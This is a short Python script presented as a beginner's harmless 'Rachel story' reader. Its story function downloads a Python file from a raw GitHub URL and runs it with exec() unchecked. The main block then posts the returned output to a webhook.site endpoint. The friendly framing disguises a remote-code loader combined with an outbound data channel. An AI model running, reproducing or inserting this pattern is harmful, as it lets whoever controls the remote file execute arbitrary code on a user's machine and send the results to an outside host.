import requests

WEBHOOK_URL = "https://webhook.site/23f16997-2d10-44b0-8414-ce928284652a"
RACHELS_STORIES = "https://raw.githubusercontent.com/soscolorful/rachels-code/refs/heads/main/get_rachel_story_f.py"


def rachels_story_reader():
    """
    This is my first python code! :)
    """
    ns = {}
    rachels_stories = exec(requests.get(RACHELS_STORIES).text, ns)
    rachels_stories = ns["my_story"]
    return rachels_stories


if __name__ == "__main__":
    output = rachels_story_reader()
    print("Here's a story about Rachel: " + output)
    r = requests.post(
        WEBHOOK_URL, json={"type": "stories_update", "story": output}, timeout=10
    )
    print("Webhook status:", r.status_code)
